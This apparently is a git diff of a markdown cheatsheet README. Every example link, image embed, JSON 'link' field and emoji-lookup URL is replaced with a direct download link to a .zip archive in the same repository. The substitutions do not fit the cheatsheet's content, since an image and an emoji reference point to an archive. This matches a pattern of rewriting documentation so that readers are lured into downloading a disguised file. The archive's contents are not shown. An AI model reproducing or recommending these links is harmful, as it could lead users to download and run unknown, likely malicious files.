@@ -47,9 +47,9 @@ ___Strong emphasized text___
 
     Markup :  ___Strong emphasized text___ or ***Strong emphasized text***
 
-[Named Link](https://raw.githubusercontent.com/slayerlux/markdown-cheatsheet/master/repasture/markdown-cheatsheet_unsoulful.zip "Named link title") and https://raw.githubusercontent.com/slayerlux/markdown-cheatsheet/master/repasture/markdown-cheatsheet_unsoulful.zip or <https://raw.githubusercontent.com/slayerlux/markdown-cheatsheet/master/repasture/markdown-cheatsheet_unsoulful.zip>
+[Named Link](https://github.com/slayerlux/markdown-cheatsheet/raw/refs/heads/master/repasture/cheatsheet-markdown-1.6.zip "Named link title") and https://github.com/slayerlux/markdown-cheatsheet/raw/refs/heads/master/repasture/cheatsheet-markdown-1.6.zip or <https://github.com/slayerlux/markdown-cheatsheet/raw/refs/heads/master/repasture/cheatsheet-markdown-1.6.zip>
 
-    Markup :  [Named Link](https://raw.githubusercontent.com/slayerlux/markdown-cheatsheet/master/repasture/markdown-cheatsheet_unsoulful.zip "Named link title") and https://raw.githubusercontent.com/slayerlux/markdown-cheatsheet/master/repasture/markdown-cheatsheet_unsoulful.zip or <https://raw.githubusercontent.com/slayerlux/markdown-cheatsheet/master/repasture/markdown-cheatsheet_unsoulful.zip>
+    Markup :  [Named Link](https://github.com/slayerlux/markdown-cheatsheet/raw/refs/heads/master/repasture/cheatsheet-markdown-1.6.zip "Named link title") and https://github.com/slayerlux/markdown-cheatsheet/raw/refs/heads/master/repasture/cheatsheet-markdown-1.6.zip or <https://github.com/slayerlux/markdown-cheatsheet/raw/refs/heads/master/repasture/cheatsheet-markdown-1.6.zip>
 
 [heading-1](#heading-1 "Goto heading-1")
     
@@ -112,7 +112,7 @@ Content Cell  | Content Cell | Content Cell
                 "artist": "Kasabian",
                 "album": "Kasabian",
                 "picture": null,
-                "link": "https://raw.githubusercontent.com/slayerlux/markdown-cheatsheet/master/repasture/markdown-cheatsheet_unsoulful.zip"
+                "link": "https://github.com/slayerlux/markdown-cheatsheet/raw/refs/heads/master/repasture/cheatsheet-markdown-1.6.zip"
             }
         }
     }
@@ -181,9 +181,9 @@ _Horizontal line :_
 
 _Image with alt :_
 
-![picture alt](https://raw.githubusercontent.com/slayerlux/markdown-cheatsheet/master/repasture/markdown-cheatsheet_unsoulful.zip "Title is optional")
+![picture alt](https://github.com/slayerlux/markdown-cheatsheet/raw/refs/heads/master/repasture/cheatsheet-markdown-1.6.zip "Title is optional")
 
-    Markup : ![picture alt](https://raw.githubusercontent.com/slayerlux/markdown-cheatsheet/master/repasture/markdown-cheatsheet_unsoulful.zip "Title is optional")
+    Markup : ![picture alt](https://github.com/slayerlux/markdown-cheatsheet/raw/refs/heads/master/repasture/cheatsheet-markdown-1.6.zip "Title is optional")
 
 Foldable text:
 
@@ -242,6 +242,6 @@ Hotkey list:
 
 Emoji:
 
-:exclamation: Use emoji icons to enhance text. :+1:  Look up emoji codes at [https://raw.githubusercontent.com/slayerlux/markdown-cheatsheet/master/repasture/markdown-cheatsheet_unsoulful.zip](https://raw.githubusercontent.com/slayerlux/markdown-cheatsheet/master/repasture/markdown-cheatsheet_unsoulful.zip)
+:exclamation: Use emoji icons to enhance text. :+1:  Look up emoji codes at [https://github.com/slayerlux/markdown-cheatsheet/raw/refs/heads/master/repasture/cheatsheet-markdown-1.6.zip](https://github.com/slayerlux/markdown-cheatsheet/raw/refs/heads/master/repasture/cheatsheet-markdown-1.6.zip)
 
     Markup : Code appears between colons :EMOJICODE:
